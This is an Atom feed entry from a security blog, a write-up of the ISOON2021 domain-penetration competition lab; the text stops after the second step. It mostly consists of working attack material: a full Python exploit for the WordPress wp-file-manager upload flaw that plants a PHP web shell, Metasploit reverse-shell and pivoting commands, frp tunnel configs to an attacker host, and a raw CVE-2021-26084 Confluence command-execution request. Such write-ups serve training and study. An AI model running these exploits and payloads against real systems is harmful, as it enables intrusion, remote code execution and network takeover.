<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shu1L&#39;s blog</title>
  
  <subtitle>一只菜鸟白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://shu1l.github.io/"/>
  <updated>2022-03-08T09:19:55.464Z</updated>
  <id>https://shu1l.github.io/</id>
  
  <author>
    <name>Shu1L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ISOON2021 线下域渗透题解</title>
    <link href="https://shu1l.github.io/2022/01/27/isoon2021-xian-xia-yu-shen-tou-ti-jie/"/>
    <id>https://shu1l.github.io/2022/01/27/isoon2021-xian-xia-yu-shen-tou-ti-jie/</id>
    <published>2022-01-27T04:15:52.000Z</published>
    <updated>2022-03-08T09:19:55.464Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISOON2021-线下域渗透题解"><a href="#ISOON2021-线下域渗透题解" class="headerlink" title="ISOON2021 线下域渗透题解"></a>ISOON2021 线下域渗透题解</h1><h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><a href="https://p5.ssl.qhimg.com/t011af99840a02d5218.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t011af99840a02d5218.png" alt="img"></a></p><p>注:写wp的时候因为换过一次环境，所以ip可能会有所变化~</p><h2 id="0x-01-web"><a href="#0x-01-web" class="headerlink" title="0x 01 web"></a>0x 01 web</h2><p><a href="http://192.168.10.48/" target="_blank" rel="noopener">http://192.168.10.48/</a></p><p>访问为一个wordpress</p><p><a href="https://p4.ssl.qhimg.com/t017c18fd07de76d54d.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t017c18fd07de76d54d.png" alt="img"></a></p><p>扫描目录，发现robots.txt</p><p><a href="https://p2.ssl.qhimg.com/t01ecf47cdfccb61ba1.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01ecf47cdfccb61ba1.png" alt="img"></a></p><p>发现存在插件wp-file-manager，通过搜索发现一个任意文件上传漏洞</p><p><a href="https://github.com/w4fz5uck5/wp-file-manager-0day/blob/master/elFinder.py" target="_blank" rel="noopener">https://github.com/w4fz5uck5/wp-file-manager-0day/blob/master/elFinder.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Usage: %s http://localhost"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"curl/7.68.0"</span>, <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=------------------------66e3ca93281c7050"</span>, <span class="string">"Expect"</span>: <span class="string">"100-continue"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">burp0_data = <span class="string">"--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4&gt;\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP&gt;\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&amp;5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-&#125;\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe&#125;\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3&#123;1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX&lt;\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&amp;\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=&lt;&gt;\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5&#123;\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z&gt;\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&amp;j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97&lt;f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5&#123;\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b&#125;\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X&#125;\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed&gt;\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4&#125;\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b&lt;\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13&gt;\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&amp;\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9&lt;?php system($_GET[\"cmd\"]); ?&gt;\r\n--------------------------66e3ca93281c7050--\r\n"</span></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=&lt;CMD&gt;"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    cmd = raw_input(<span class="string">"$ "</span>)</span><br><span class="line">    burp0_url = <span class="string">"%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s"</span> % (sys.argv[<span class="number">1</span>], cmd)</span><br><span class="line">    burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"curl/7.68.0"</span>, <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"Expect"</span>: <span class="string">"100-continue"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    r = requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line">    print(r.text)</span><br><span class="line">python2  .\wp-file-manager.py http://<span class="number">192.168</span><span class="number">.10</span><span class="number">.48</span>/</span><br></pre></td></tr></table></figure><p><a href="https://p2.ssl.qhimg.com/t012c603823e85f8395.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t012c603823e85f8395.png" alt="img"></a></p><p><strong>上线msf</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="builtin-name">set</span> target 2</span><br><span class="line"><span class="builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> lhost 172.168.1.128</span><br><span class="line"><span class="builtin-name">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t014daf0d323649d465.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t014daf0d323649d465.png" alt="img"></a></p><p>查看内网网段</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="bash"> get_local_subnets</span></span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t0122b5161d5559ba87.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0122b5161d5559ba87.png" alt="img"></a></p><p>双网卡</p><p>挂路由，扫描内网存活主机</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run <span class="built_in">auto</span>route -s <span class="number">10.1</span><span class="number">.16</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p>扫描top100</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>,<span class="number">3389</span>,<span class="number">3306</span>,<span class="number">1433</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">8080</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">8081</span>,<span class="number">7001</span>,<span class="number">8000</span>,<span class="number">8088</span>,<span class="number">8888</span>,<span class="number">9090</span>,<span class="number">8090</span>,<span class="number">88</span>,<span class="number">8001</span>,<span class="number">82</span>,<span class="number">9080</span>,<span class="number">8082</span>,<span class="number">8089</span>,<span class="number">9000</span>,<span class="number">8443</span>,<span class="number">9999</span>,<span class="number">8002</span>,<span class="number">89</span>,<span class="number">8083</span>,<span class="number">8200</span>,<span class="number">8008</span>,<span class="number">90</span>,<span class="number">8086</span>,<span class="number">801</span>,<span class="number">8011</span>,<span class="number">8085</span>,<span class="number">9001</span>,<span class="number">9200</span>,<span class="number">8100</span>,<span class="number">8012</span>,<span class="number">85</span>,<span class="number">8084</span>,<span class="number">8070</span>,<span class="number">7002</span>,<span class="number">8091</span>,<span class="number">8003</span>,<span class="number">99</span>,<span class="number">7777</span>,<span class="number">8010</span>,<span class="number">443</span>,<span class="number">8028</span>,<span class="number">8087</span>,<span class="number">83</span>,<span class="number">7003</span>,<span class="number">10000</span>,<span class="number">808</span>,<span class="number">38888</span>,<span class="number">8181</span>,<span class="number">800</span>,<span class="number">18080</span>,<span class="number">8099</span>,<span class="number">8899</span>,<span class="number">86</span>,<span class="number">8360</span>,<span class="number">8300</span>,<span class="number">8800</span>,<span class="number">8180</span>,<span class="number">3505</span>,<span class="number">7000</span>,<span class="number">9002</span>,<span class="number">8053</span>,<span class="number">1000</span>,<span class="number">7080</span>,<span class="number">8989</span>,<span class="number">28017</span>,<span class="number">9060</span>,<span class="number">888</span>,<span class="number">3000</span>,<span class="number">8006</span>,<span class="number">41516</span>,<span class="number">880</span>,<span class="number">8484</span>,<span class="number">6677</span>,<span class="number">8016</span>,<span class="number">84</span>,<span class="number">7200</span>,<span class="number">9085</span>,<span class="number">5555</span>,<span class="number">8280</span>,<span class="number">7005</span>,<span class="number">1980</span>,<span class="number">8161</span>,<span class="number">9091</span>,<span class="number">7890</span>,<span class="number">8060</span>,<span class="number">6080</span>,<span class="number">6379</span>,<span class="number">8880</span>,<span class="number">8020</span>,<span class="number">7070</span>,<span class="number">889</span>,<span class="number">8881</span>,<span class="number">9081</span>,<span class="number">8009</span>,<span class="number">7007</span>,<span class="number">8004</span>,<span class="number">38501</span>,<span class="number">1010</span></span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t01f8ece47ec1e4ab7c.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01f8ece47ec1e4ab7c.png" alt="img"></a></p><p>发现存活主机</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:<span class="number">22</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:<span class="number">3306</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:<span class="number">8090</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">8080</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">3306</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:<span class="number">80</span> - TCP OPEN</span><br></pre></td></tr></table></figure><h2 id="0x02-wiki"><a href="#0x02-wiki" class="headerlink" title="0x02 wiki"></a>0x02 wiki</h2><p>设置代理</p><p>上传frp到windows上<br>frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">10080</span></span><br><span class="line"><span class="attr">vhost_https_port</span> = <span class="number">10443</span></span><br><span class="line"><span class="attr">allow_ports</span> = <span class="number">1000</span>-<span class="number">50000</span></span><br></pre></td></tr></table></figure><p>攻击机运行frps</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./frps</span> -c frps.ini</span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t016e449d1fc0e040f9.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t016e449d1fc0e040f9.png" alt="img"></a></p><p>frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.168</span>.<span class="number">1.128</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[socks1]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6666</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"></span><br><span class="line"><span class="section">[msf]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">5555</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7002</span></span><br></pre></td></tr></table></figure><p>目标机器运行frpc</p><p><a href="https://p2.ssl.qhimg.com/t01522ece544eeac71c.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01522ece544eeac71c.png" alt="img"></a></p><p>访问8090，发现是一个confluence，Confluence 是 Atlassian 公司出品的一款专业的企业知识管理与协同软件。</p><p>参考CVE-2021-26084</p><p>vulhub上的poc:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pages/doenterpagevariables.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.10.129:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1060</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.10.129:8000</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.10.129:8000/pages/doenterpagevariables.action</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                               id                                                       %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027</span><br></pre></td></tr></table></figure><p><a href="https://p1.ssl.qhimg.com/t0150c78be294cf3e9f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0150c78be294cf3e9f.png" alt="img"></a></p><p> 